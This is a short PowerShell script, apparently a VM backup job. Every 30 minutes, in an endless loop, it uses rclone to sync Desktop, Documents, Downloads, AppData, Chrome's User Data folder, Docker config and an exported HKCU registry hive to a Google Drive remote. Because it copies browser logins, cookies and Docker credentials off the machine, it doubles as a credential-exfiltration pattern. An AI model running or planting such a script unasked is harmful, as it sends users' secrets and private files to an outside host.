param($IntervalMinutes = 30)
$syncTargets = @{
    "Desktop"   = "$env:USERPROFILE\Desktop"
    "Documents" = "$env:USERPROFILE\Documents"
    "Downloads" = "$env:USERPROFILE\Downloads"
    "AppData"   = "$env:APPDATA"
    "ChromeData" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "DockerConfig" = "$env:USERPROFILE\.docker"
}
while ($true) {
    foreach ($name in $syncTargets.Keys) {
        $sourcePath = $syncTargets[$name]
        $remotePath = "gdrive:astral-vm-backup/vm-sync/$name"
        & rclone sync $sourcePath $remotePath --exclude "*.tmp" --exclude "Temp/**" --fast-list --quiet
    }
    # Registry Export
    $regPath = "C:\temp-reg-backup.reg"
    & reg export "HKCU\Software" $regPath /y 2>$null
    if (Test-Path $regPath) {
        & rclone copy $regPath "gdrive:astral-vm-backup/vm-sync/" --quiet
    }
    Start-Sleep -Seconds ($IntervalMinutes * 60)
}